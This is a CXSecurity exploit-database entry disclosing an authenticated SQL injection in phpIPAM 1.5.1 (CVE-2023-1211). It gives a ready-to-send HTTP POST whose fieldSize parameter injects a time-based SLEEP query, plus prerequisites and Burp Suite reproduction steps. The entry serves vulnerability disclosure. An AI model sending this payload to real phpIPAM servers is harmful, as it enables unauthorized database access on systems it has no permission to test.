---
title: phpIPAM 1.5.1 SQL Injection
url: https://cxsecurity.com/issue/WLB-2025120007
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-09
fetch_date: 2025-12-10T03:19:49.040793
---

# phpIPAM 1.5.1 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **phpIPAM 1.5.1 SQL Injection** **2025.12.09**  Credit:  **[CodeSecLab](https://cxsecurity.com/author/CodeSecLab/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-1211](https://cxsecurity.com/cveshow/CVE-2023-1211/ "Click to see CVE-2023-1211")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: phpIPAM 1.5.1 - SQL Injection
# Date: 2025-11-25
# Exploit Author: CodeSecLab
# Vendor Homepage: https://github.com/phpipam/phpipam/
# Software Link: https://github.com/phpipam/phpipam/
# Version: 1.5.1
# Tested on: Windows
# CVE : CVE-2023-1211
Proof Of Concept
POST /app/admin/custom-fields/edit-result.php HTTP/1.1
Host: phpipam
Cookie: PHPSESSID=<valid\_session\_id>; csrf\_cookie=<valid\_csrf\_token>
Content-Type: application/x-www-form-urlencoded
csrf\_cookie=<valid\_csrf\_token>&action=add&name=custom\_sqli\_test&fieldType=enum&fieldSize=0)%3B+SELECT+SLEEP(10)%3B+--+&table=devices&Comment=sql\_poc&NULL=YES
\*\*Prerequisites:\*\*
1. Valid authenticated session (PHPSESSID cookie)
2. Valid CSRF token (obtain from `/admin/custom-fields/` page first)
3. Target table must exist (default 'devices' table used)
4. Field type must be enum/set to reach vulnerable code path
\*\*Manual Test Steps:\*\*
1. Login to phpIPAM
2. Visit `/admin/custom-fields/` to get CSRF token
3. Send POST request with above payload
\*\*Note:\*\* Replace `<valid\_session\_id>` and `<valid\_csrf\_token>` with actual values from authenticated session. The `fieldSize` parameter injects SQL through enum/set type definition context.
Steps to Reproduce
Login as an admin user.
Intercept and send the malicious request using a web proxy tool such as Burp Suite, ensure it includes a valid session cookie and csrf token.
Observe the result

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120007)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top